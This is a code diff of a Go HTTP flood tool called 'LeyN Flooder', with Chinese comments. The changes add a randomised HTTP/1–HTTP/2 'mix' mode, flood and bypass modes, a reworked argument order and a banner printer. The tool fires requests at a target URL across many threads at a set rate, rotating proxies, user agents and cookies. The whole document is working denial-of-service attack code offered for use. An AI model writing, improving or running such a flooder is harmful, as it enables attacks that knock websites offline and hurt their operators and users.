@@ -38,29 +38,35 @@ type RequestInfo struct {
 func main() {
 	initLogger()
 
+	// 更新后的命令行参数格式：./flooder method URL时间 速率(每线程) 线程数 http_version (1/2/mix) mode
 	if len(os.Args) != 8 {
-		fmt.Println("Usage: ./程序 模式 URL地址 持续时间(秒) 速率(每线程) 线程数 协议(1/2/3) method(GET/POST)")
+		fmt.Println("Usage: ./program mode(GET/POST) URL duration(seconds) rate(req/sec) threads version(1/2/mix) method(flood/bypass)")
 		return
 	}
 
-	mode := os.Args[1]
-	target := os.Args[2]
-	duration, _ := strconv.Atoi(os.Args[3])
-	rate, _ := strconv.Atoi(os.Args[4])
-	threads, _ := strconv.Atoi(os.Args[5])
-	httpVer := os.Args[6]
-	method := os.Args[7]
+	method := os.Args[1]                    // 请求方式 GET/POST
+	target := os.Args[2]                    // 目标 URL
+	duration, _ := strconv.Atoi(os.Args[3]) // 持续时间
+	rate, _ := strconv.Atoi(os.Args[4])     // 每线程请求速率
+	threads, _ := strconv.Atoi(os.Args[5])  // 线程数
+	httpVer := os.Args[6]                   // HTTP版本 1/2/mix
+	mode := os.Args[7]                      // 模式，支持不同的模式（如 flood 或其他）
 
 	log.Info().Str("version", "v1.0").Msg("LeyN Flooder starting")
 	fmt.Printf("%s[INFO] - LeyN Flooderv1.0%s\n", green, reset)
 
 	title := getTitle(target)
 	load := getLoad(mode)
-	fmt.Printf("%sTitle:%s%s\n", yellow, title, reset)
-	fmt.Printf("%sLoad:%d\n", yellow, load)
-	fmt.Printf("Method:%s %s\n", mode, reset)
+
+	boxContent := []string{
+		fmt.Sprintf("Title : %s", title),
+		fmt.Sprintf("Load  : %d", load),
+		fmt.Sprintf("Method: %s / %s", mode, method),
+	}
+	printBox(boxContent)
 
 	var requests []RequestInfo
+	// 读取代理和用户代理信息
 	if mode == "flood" {
 		proxies := readLines("proxy.txt")
 		uas := readLines("ua.txt")
@@ -75,10 +81,6 @@ func main() {
 				requests = append(requests, RequestInfo{Proxy: parts[0], UA: parts[1], Cookie: parts[2]})
 			}
 		}
-	}
-
-	if len(requests) >= 2 {
-		fmt.Printf("%s[Proxy] - %v\n", yellow, requests[0:2])
 	}
 
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
@@ -98,7 +100,16 @@ func main() {
 					return
 				case <-tick.C:
 					reqInfo := requests[rand.Intn(len(requests))]
-					go sendRequest(target, method, reqInfo, httpVer)
+					// 如果是 mix 模式，随机选择 HTTP/1 或 HTTP/2
+					if httpVer == "mix" {
+						if rand.Intn(2) == 0 {
+							go sendRequest(target, method, reqInfo, "1") // 使用 HTTP/1
+						} else {
+							go sendRequest(target, method, reqInfo, "2") // 使用 HTTP/2
+						}
+					} else {
+						go sendRequest(target, method, reqInfo, httpVer) // 使用指定的 HTTP 版本
+					}
 				}
 			}
 		}()
@@ -229,4 +240,26 @@ func initLogger() {
 	consoleWriter := zerolog.ConsoleWriter{Out: os.Stdout, TimeFormat: "15:04:05"}
 	multi := io.MultiWriter(consoleWriter, logFile)
 	log.Logger = zerolog.New(multi).With().Timestamp().Logger()
+}
+
+func printBox(lines []string) {
+	// 计算最长行宽
+	maxLen := 0
+	for _, line := range lines {
+		if len(line) > maxLen {
+			maxLen = len(line)
+		}
+	}
+
+	// 打印顶部边框
+	fmt.Printf("┌%s┐\n", strings.Repeat("─", maxLen+2))
+
+	// 打印内容行
+	for _, line := range lines {
+		padding := maxLen - len(line)
+		fmt.Printf("│ %s%s │\n", line, strings.Repeat(" ", padding))
+	}
+
+	// 打印底部边框
+	fmt.Printf("└%s┘\n", strings.Repeat("─", maxLen+2))
 }
